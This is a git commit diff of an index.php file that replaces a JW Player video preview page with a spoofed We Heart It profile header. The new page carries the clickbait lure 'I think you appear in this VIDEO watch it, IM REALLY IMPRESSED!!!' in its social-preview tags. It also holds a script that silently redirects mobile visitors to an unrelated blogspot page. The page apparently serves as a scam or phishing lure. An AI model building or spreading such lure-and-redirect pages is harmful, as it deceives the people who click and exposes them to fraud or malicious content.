63c5fed223ae7a82162033cb3961ef393d2d5811
icm654987 <50081558+icm654987@users.noreply.github.com>
2019-08-21 17:16:27 -0400

    Update index.php

--- index.php
+++ index.php
@@ -1,57 +1,47 @@
 
-<!DOCTYPE html>
-<html>
-  <head prefix="og:http://ogp.me/ns#">
-    <title>Watch</title>
-    <meta charset="utf-8">
-    <meta property="og:url" content="https://content.jwplatform.com/previews/ZidCgsUk-bcBnvKNx">
-    <meta property="og:title" content="Watch">
-    <meta property="og:image" content="https://assets-jpcust.jwpsrv.com/thumbs/ZidCgsUk-720.jpg">
-    <meta property="og:type" content="video">
-    <meta property="og:video" content="">
-    <meta property="og:video:secure_url" content="">
-    <meta property="og:video:type" content="video/mp4">
-    <meta property="og:video:width" content="320">
-    <meta property="og:video:height" content="260">
-    <meta name="twitter:card" content="player">
-    <meta name="twitter:player" content="https://content.jwplatform.com/players/ZidCgsUk-bcBnvKNx.html">
-    <meta name="twitter:player:width" content="320">
-    <meta name="twitter:player:height" content="260">
-    <meta name="twitter:player:stream" content="https://content.jwplatform.com/videos/ZidCgsUk-640.mp4">
-    <meta name="twitter:player:stream:content_type" content="video/mp4; codecs=&quot;avc1.42E01E, mp4a.40.2&quot;">
-    <style type="text/css">
-        body { background: #2f3542; color: #FFF; font: 1rem/1.5 Arial, sans-serif; margin: 0 auto; padding: 0; overflow: hidden }
-        #title, #description { display: none; font-weight: normal; -webkit-font-smoothing: antialiased }
-        #title { font-size: 24px; margin: 40px auto 10px }
-        #description { color: #aab4c8; font-size: 14px; margin: 15px auto }
-    </style>
-    <script type="text/javascript">
-    </script>
-  </head>
-  <body>
-    <h1 id="title">Watch</h1>
-    <div id="botr_ZidCgsUk_bcBnvKNx_div"></div>
-    <script type="text/javascript" src="https://content.jwplatform.com/players/ZidCgsUk-bcBnvKNx.js"></script>
-    <p id="description"></p>
-    <script>
-        if (window == window.top) {
-            document.getElementById("title").style.display = "block";
-            document.getElementById("description").style.display = "block";
-            document.body.style.width = "70%";
-            document.body.style.overflow = "visible";
-        } else {
-          /** Used to pass play/pause messages parent iframe via postMessage **/
-          window.addEventListener("message", function(evt) {
-            switch (evt.data) {
-              case "play":
-                jwplayer().play(true);
-                break;
-              case "pause":
-                jwplayer().pause(true);
-                break;
-            }
-          });
-        }
-    </script>
-  </body>
-</html>
+<meta charset="UTF-8" />
+<meta name="robots" content="noindex,follow" />
+<meta name="author" content="We Heart It | Get lost in what you love" />
+<meta name="description" content="See what 😲I think you appear in this VIDEO watch it, IM REALLY IMPRESSED!!!😲 (toolsdebug) found on We Heart It, your everyday app to get lost in what you love." />
+<meta name="keywords" content="😲I think you appear in this VIDEO watch it, IM REALLY IMPRESSED!!!😲, toolsdebug" />
+<meta name="verify-v1" content="yWQd1QQOfyW6rzPkONyfqW5FWN893CD28NUQk30n2Po=" />
+<meta name="apple-itunes-app" content="app-id=539124565, app-argument=whi://user/toolsdebug" />
+<meta name="google" value="notranslate" />
+<meta name="google-site-verification" content="2CvSp512_iBKdx3E2WmmD14XybjcyQUa7hn9L2Non98" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+<meta name="p:domain_verify" content="ffbe899db827967e40cf58e30bed6c38" />
+<meta property="al:ios:url" content="whi://user/toolsdebug" />
+<meta property="al:ios:app_store_id" content="539124565" />
+<meta property="al:ios:app_name" content="We Heart It" />
+<meta property="al:android:url" content="whi://user/toolsdebug" />
+<meta property="al:android:app_name" content="We Heart It" />
+<meta property="al:android:package" content="com.weheartit" />
+<meta property="al:web:url" content="https://weheartit.com/toolsdebug" />
+<meta property="al:web:should_fallback" content="false" />
+<meta name="branch:deeplink:$ios_url" content="https://weheartit.com/user/toolsdebug" />
+<meta name="branch:deeplink:$android_url" content="https://weheartit.com/user/toolsdebug" />
+<meta name="branch:deeplink:$deeplink_path" content="https://weheartit.com/user/toolsdebug" />
+<meta name="branch:deeplink:$ios_deeplink_path" content="https://weheartit.com/user/toolsdebug" />
+<meta name="branch:deeplink:$android_deeplink_path" content="https://weheartit.com/user/toolsdebug" />
+<meta name="branch:deeplink:$desktop_url" content="https://www.weheartit.com/toolsdebug" />
+<meta property="fb:app_id" content="200368456664008" />
+<meta property="og:site_name" content="We Heart It" />
+<meta property="og:type" content="weheartitapp:friend" />
+<meta property="og:url" content="https://weheartit.com/toolsdebug" />
+<meta property="og:title" content="😲I think you appear in this VIDEO watch it, IM REALLY IMPRESSED!!!😲" />
+<meta property="og:description" content="😲I think you appear in this VIDEO watch it, IM REALLY IMPRESSED!!!😲's favorite images from the web" />
+<meta property="og:image" content="https://data.whicdn.com/avatars/62704693/original.jpg?t=1566421758" />
+<meta property="weheartitapp:username" content="toolsdebug" />
+<meta property="weheartitapp:hearts" content="0" />
+<meta name="msapplication-TileColor" content="#ff4477" />
+<meta name="theme-color" content="#ff4477" />
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="0DNeAbADgl3Ian+lLjhqoo8fkEUVYwvSADjuNtdGeY+ylJtSv9wDEVD9wIMZzOTIVgfAK7qc1juheLcuw4NjiQ==" />
+
+        <script type='text/javascript'>
+<!--
+if (screen.width <= 700) {
+document.location = "https://deyaniramedranomercedes.blogspot.com/";
+}
+//-->
+</script>
